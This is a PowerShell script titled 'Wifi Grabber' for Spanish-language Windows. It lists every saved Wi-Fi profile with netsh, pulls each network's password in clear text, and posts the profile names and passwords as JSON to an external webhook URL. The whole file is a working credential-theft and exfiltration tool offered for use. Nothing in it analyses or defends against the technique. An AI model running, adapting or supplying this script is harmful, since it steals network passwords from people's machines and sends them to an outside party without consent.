<#
  Wifi Grabber – Webhook Win-ES (captura "Perfil de todos los usuarios")
#>

# 1) Tu webhook
$webhook = 'https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64'

# 2) Extraer SSIDs
$ssids = netsh wlan show profiles `
    | Select-String 'Perfil de todos los usuarios\s*:\s*(.+)$' `
    | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() }

# 3) Para cada SSID, extraer contraseña
$result = foreach($name in $ssids) {
    $det = netsh wlan show profile name="$name" key=clear
    $line = $det | Select-String 'Contenido de la clave\s*:\s*(.+)$'
    $pass = if($line) { $line.Matches[0].Groups[1].Value.Trim() } else { '' }
    [PSCustomObject]@{ Profile = $name; Password = $pass }
}

# 4) Enviar JSON al webhook
$json = $result | ConvertTo-Json
try {
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body $json
    Write-Host "✅ Enviado OK:`n$json"
} catch {
    Write-Error "❌ Error enviando: $_"
}

# 5) Pause para que veas salida (solo en debug)
Read-Host -Prompt 'Presiona ENTER para cerrar'
